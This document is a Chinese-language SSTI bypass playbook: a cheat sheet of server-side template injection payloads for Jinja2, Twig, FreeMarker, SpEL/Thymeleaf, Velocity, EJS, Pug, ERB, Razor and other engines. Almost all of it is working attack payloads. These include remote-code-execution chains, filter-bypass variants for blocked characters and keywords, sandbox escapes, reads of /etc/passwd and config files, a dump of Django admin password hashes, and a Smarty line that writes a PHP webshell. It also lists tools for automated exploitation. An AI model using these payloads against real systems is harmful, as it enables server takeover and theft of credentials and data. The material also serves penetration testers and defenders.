# SSTI Bypass Playbook

这是 SSTI 绕过与执行载荷清单，按上下文、过滤条件和模板引擎选用。内容只给可迁移的 payload 形态和变形方向，不规定固定工作流。

## 上下文与入口

### 模板文本

用户输入直接成为模板源码文本时，优先使用对应分隔符求值：

```text
{{7*7}}                 Jinja2 / Twig / Nunjucks / Pebble / Jinjava / Handlebars-like
${7*7}                  FreeMarker / Java EL / SpEL / Groovy / Mako-like
#{7*7}                  SpEL / Thymeleaf / FreeMarker legacy / Pug / Slim
<%= 7*7 %>              ERB / EJS / ASP / EEx / Mojolicious
@(1+2)                  Razor
[=3*3]                  FreeMarker alternative syntax
```

### 表达式或变量名内部

用户输入被拼在已有表达式里时，先闭合当前表达式，再进入可执行语法：

```text
user}} {{7*7}} {{
user%}{{7*7}}{%
user') }}{{7*7}}{{ ('
user") }}{{7*7}}{{ ("
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

### 语句标签可用但表达式标签受限

Jinja2 / Twig / Nunjucks / Mako 等允许 statement tag 时，可以避开 `{{...}}`：

```jinja2
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% with x = lipsum.__globals__['os'].popen('id').read() %}{{x}}{% endwith %}
{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %}OK{% endif %}
{% set x = cycler.__init__.__globals__.os.popen('id').read() %}{{x}}
```

### 模板名、view name、include、二次渲染

很多 SSTI 不在页面文本，而在模板名或二次渲染点：

```text
Spring/Thymeleaf view name: __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
Twig include: {{ include('wp-config.php') }}
Jinja include/config: {{ config.from_pyfile('/tmp/x.py') }}
CMS/email/PDF/Markdown: 保存 {{7*7}} 后由预览、发送、导出或后台审核触发第二次 render
Handlebars layout/path: layout=../../routes/index.js 或模板 partial/helper 名称可控时找 LFI/RCE 链
```

### 无回显、错误、延迟、OOB

同一执行链可以换成不同反馈通道：

```text
Rendered:     {{ lipsum.__globals__['os'].popen('id').read() }}
Error-based:  {{ cycler.__init__.__globals__.__builtins__.getattr('', 'x' + cycler.__init__.__globals__.os.popen('id').read()) }}
Boolean:      {{ 1 / (cycler.__init__.__globals__.os.popen('id')._proc.wait() == 0) }}
Time:         {{ lipsum.__globals__['os'].popen('sleep 3').read() }}
OOB/write:    {{ lipsum.__globals__['os'].popen('id > static/proof.txt').read() }}
```

## 过滤绕过

### 禁 `{{` / `}}`

```jinja2
{% print(7*7) %}
{% if 7*7 == 49 %}OK{% endif %}
{% with x = lipsum.__globals__['os'].popen('id').read() %}{{x}}{% endwith %}
```

```text
${7*7}          Java/FreeMarker/Mako/Groovy
#{7*7}          SpEL/Thymeleaf/FreeMarker legacy/Pug/Slim
<%= 7*7 %>      ERB/EJS/ASP/EEx
@(1+2)          Razor
[=3*3]          FreeMarker
```

### 禁 `{` / `}`

```text
<%= `id` %>                                      ERB
<%= global.process.mainModule.require('child_process').execSync('id') %>  EJS
@(System.Diagnostics.Process.Start("cmd.exe","/c whoami"))                Razor
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x                   Thymeleaf view preprocessing
```

### 禁 `%`

```text
{{ lipsum.__globals__['os'].popen('id').read() }}   Jinja2 expression-only
${"freemarker.template.utility.Execute"?new()("id")} FreeMarker inline
{{['id']|map('system')|join}}                       Twig expression-only
```

### 禁 `.`

```jinja2
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
```

```java
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
${T(java.lang.Runtime)['getRuntime']()['exec']('id')}
```

### 禁 `_`

```jinja2
{{ request|attr('\x5f\x5fclass\x5f\x5f') }}
{{ request|attr(["_"*2,"class","_"*2]|join) }}
{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}
```

```text
?f=%s%sclass%s%s&a=_
headers/cookies/query 中传入 __class__、__globals__、__builtins__、__import__
```

### 禁 `[` / `]`

```jinja2
{{ request|attr('__getitem__')('application')|attr('__getitem__')('__globals__') }}
{{ request|attr(request.args.getlist(request.args.l)|join) }}
```

```text
?l=a&a=_&a=_&a=class&a=_&a=_
```

### 禁引号

```jinja2
{{ request|attr(request.args.c) }}                 ?c=__class__
{{ config.__class__.from_envvar.__globals__.import_string(request.args.m).popen(request.args.c).read() }}  ?m=os&c=id
```

```text
Java: T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))
FreeMarker: 9?lower_abc + 4?lower_abc              生成 id
PHP/Twig: query 参数承载函数名/命令，map/call_user_func 调用
Node: 从已有字符串 constructor、process、mainModule 派生
```

### 禁空格

```text
{{7*7}}
{{lipsum.__globals__['os'].popen('cat$IFS/etc/passwd').read()}}
{{['cat$IFS/etc/passwd']|map('system')|join}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<%=IO.popen('id').read%>
```

命令空格替代：

```text
$IFS
${IFS}
tab/newline
cat</etc/passwd
/bin/sh,-c,id 传给 ProcessBuilder/数组参数
```

### 禁括号

```twig
{{['id']|map('system')|join}}
{{['id']|filter('system')}}
```

```jinja2
{% if lipsum.__globals__['os'].popen('id').read().startswith('uid=') %}OK{% endif %}
```

```text
Razor: @DateTime.Now / @Model.Property 类表达式先确认动态编译
Velocity: #set($x=...)$x
```

### 禁管道 `|`

```jinja2
{{ request.__class__ }}
{{ request['__class__'] }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```twig
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{dump(_context)}}
```

### 禁数字

```text
Jinja2: true+true、false、字符串长度、range|length、已有对象切片
Java: Boolean.TRUE.compareTo(false)、Character.toString(...)
FreeMarker: true?string、?length、?index_of、lower_abc/upper_abc
Ruby/PHP/Node: 字符串 length、ord/chr、布尔算术
```

### 禁字母

```text
从 request 参数/header/cookie 带入关键字
用 hex/unicode 转义生成 __globals__、os、id、system
从已有字符串切片拼接函数名
利用模板内置对象短名：self、config、request、app、_context、cycler、joiner、lipsum、namespace
```

### 禁关键字

```text
os        -> lipsum.__globals__['o'+'s'] / import_string('os') / request 参数
system    -> popen / passthru / shell_exec / call_user_func / ProcessBuilder / Runtime.exec / child_process
import    -> __builtins__['__import__'] / import_string / forName / constructor / _load
class     -> attr('__class__') / getClass() / TYPE / constructor
config    -> request.application / url_for.__globals__ / get_flashed_messages.__globals__
```

### 长度限制

```text
Jinja2 短链: {{lipsum.__globals__['os'].popen('id').read()}}
Jinja2 参数外置: {{lipsum.__globals__['os'].popen(request.args.c).read()}}&c=id
Twig 短链: {{['id']|map('system')|join}}
FreeMarker 短链: ${"freemarker.template.utility.Execute"?new()("id")}
Ruby 短链: <%=`id`%>
EEx 短链: <%=elem(System.shell("id"),0)%>
```

### Sandbox

```text
Jinja2: lipsum/cycler/joiner/namespace.__globals__ 优先于 __subclasses__ offset
Jinja2: config.__class__.from_envvar.__globals__.import_string('os').popen('id').read()
Twig: map/filter/reduce/sort + callable，_self.env/registerUndefinedFilterCallback 老版本链
FreeMarker: ?new 可用时 Execute；受限时找 ObjectWrapper/TemplateModel/可访问业务对象 classloader
SpEL/EL: T(java.lang.Runtime) 被禁时 ''.getClass().forName(...) 或 request/session 反射
Node: process/mainModule/constructor/_load、helper、prototype pollution、layout traversal
Ruby/ERB: Kernel、IO、Open3、反引号；Liquid/Mustache 默认能力弱，优先找自定义 filter/helper
Go template: RCE 依赖传入对象公开方法；先利用 {{.}}、{{.Field}}、{{call .Fn "id"}}
```

### Autoescape / HTML escape

SSTI 执行与 HTML 是否转义是两件事。需要 HTML impact 时才考虑：

```jinja2
{{'<script>alert(1)</script>'|safe}}
```

服务端执行仍优先看：

```text
数字结果、对象字符串、错误、文件内容、命令输出、写文件、OOB 请求
```

## 引擎载荷

### Jinja2 / Flask

```jinja2
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
{% debug %}
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.from_envvar.__globals__.import_string('os').popen('id').read()}}
```

无 `{{ }}`：

```jinja2
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% with x = lipsum.__globals__['os'].popen(request.args.c).read() %}{{x}}{% endwith %}
```

无 `.` / `_` / `[]` 组合：

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Django Templates

```django
{{364|add:733}}
{% debug %}
{{messages.storages.0.signer.key}}
{% include 'admin/base.html' %}
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}}:{{e.user.password}}{% endfor %}
{{'<script>alert(1)</script>'|safe}}
```

### Mako / Tornado / Bottle

```mako
${7*7}
<% import os; x=os.popen('id').read() %>${x}
${self.module.cache.util.os.popen('id').read()}
${self.template.__init__.__globals__['os'].popen('id').read()}
```

```tornado
{{7*7}}
{% import os %}{{os.popen('id').read()}}
```

### Twig

```twig
{{7*7}}
{{7*'7'}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
{{include('wp-config.php')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{{'id':'shell_exec'}|map('call_user_func')|join}}
{{[0]|reduce('system','id')}}
{{['cat$IFS/etc/passwd']|map('system')|join}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

无引号/混淆：

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

### Smarty / Blade / Latte

```smarty
{$smarty.version}
{php}echo `id`;{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

```blade
{{7*7}}
{{system('id')}}
{{passthru(request('c'))}}
```

```latte
{var $X="POC"}{$X}
{php system('id')}
```

### FreeMarker

```freemarker
${3*3}
#{3*3}
[=3*3]
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

字符构造：

```freemarker
${9?lower_abc+4?lower_abc}
```

老版本 sandbox：

```freemarker
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

### SpEL / Java EL / Thymeleaf / OGNL

```java
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
[(7*7)]
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
```

OGNL：

```java
@java.lang.Integer@valueOf('1')
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
```

Java 字符拼接：

```java
${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))}
```

### Velocity / Pebble / Jinjava / Groovy

```velocity
#set($x=7*7)$x
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($out=$p.getInputStream())
#foreach($i in [1..$out.available()])$out.read()#end
```

```pebble
{{someString.toUPPERCASE()}}
{{variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
```

```jinjava
{{'a'.toUpperCase()}}
{{request}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"id\"); x.start()")}}
```

```groovy
${9*9}
${new File('/etc/passwd').text}
${"id".execute().text}
${((char)105).toString()+((char)100).toString()}
```

### JavaScript / Node

EJS / Underscore：

```ejs
<%= 7*7 %>
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

Pug：

```pug
#{7*7}
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
```

Nunjucks：

```nunjucks
{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

Handlebars：

```handlebars
{{this}}
{{self}}
{{#with "s" as |string|}}{{#with string.sub as |sub|}}{{lookup sub "constructor"}}{{/with}}{{/with}}
```

Lodash：

```lodash
{{= _.VERSION}}
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

### Ruby / .NET / Go / Elixir / Perl

```erb
<%= 7*7 %>
<%= File.read('/etc/passwd') %>
<%= `id` %>
<%= IO.popen('id').read %>
<% require 'open3' %><% _i,o,_e,_t=Open3.popen3('id') %><%= o.read %>
```

```slim
#{7*7}
#{%x|id|}
```

```razor
@(1+2)
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@{ var p = System.Diagnostics.Process.Start("/bin/sh","-c id"); }
```

```asp
<%= 7*7 %>
<%= CreateObject("Wscript.Shell").Exec("whoami").StdOut.ReadAll() %>
```

```gotemplate
{{ . }}
{{ .Password }}
{{ printf "%s" "ssti" }}
{{ call .System "id" }}
{{ .System "id" }}
```

```eex
<%= 7*7 %>
<%= File.read!("/etc/passwd") %>
<%= elem(System.shell("id"),0) %>
```

```mojo
<%= 7*7 %>
<%= qx(id) %>
```

## 工具对应场景

```text
TInjA      多引擎 polyglot 指纹、SSTI/CSTI 快速区分
SSTImap    已知 URL/参数/请求体后的自动化枚举与交互 shell
tplmap     老环境、Python2 兼容链或历史 payload 对照
Fenjing    Jinja2/Flask 过滤极强时生成 payload 变体
```
